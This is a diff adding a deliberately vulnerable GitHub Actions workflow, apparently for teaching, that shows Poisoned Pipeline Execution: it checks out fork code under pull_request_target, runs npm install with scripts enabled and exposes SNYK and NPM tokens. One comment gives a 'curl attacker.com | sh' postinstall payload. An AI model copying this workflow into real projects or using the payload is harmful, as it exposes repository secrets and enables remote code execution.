@@ -1,0 +1,70 @@
+# EXAMPLE ONLY - This file is intentionally vulnerable for demonstration purposes
+# DO NOT place in .github/workflows/
+#
+# Vulnerability: Poisoned Pipeline Execution (PPE)
+# This workflow checks out untrusted code from a fork PR and then runs `npm install`,
+# which executes arbitrary post-install scripts defined in the fork's package.json.
+# Combined with pull_request_target, this grants the attacker access to repo secrets.
+
+name: Dependency Review
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  dependency-review:
+    name: Review Dependencies
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR head (UNSAFE - checks out untrusted fork code)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install dependencies for audit
+        run: |
+          # VULNERABLE: npm install executes lifecycle scripts from untrusted package.json
+          # A malicious fork can add "postinstall": "curl attacker.com | sh" to package.json
+          npm install --ignore-scripts=false
+          npm audit --json > audit-results.json
+
+      - name: Run dependency license check
+        run: |
+          npx license-checker --json > license-report.json
+
+      - name: Check for known vulnerabilities
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          # Secrets are available because of pull_request_target
+          # Untrusted code from the fork can access these via process.env
+          node scripts/check-deps.js
+
+      - name: Post results comment
+        if: always()
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            const fs = require('fs');
+            const audit = JSON.parse(fs.readFileSync('audit-results.json', 'utf8'));
+            const vulns = audit.metadata?.vulnerabilities || {};
+            const total = Object.values(vulns).reduce((a, b) => a + b, 0);
+
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              body: `## Dependency Review\n\nFound ${total} vulnerabilities.`
+            });
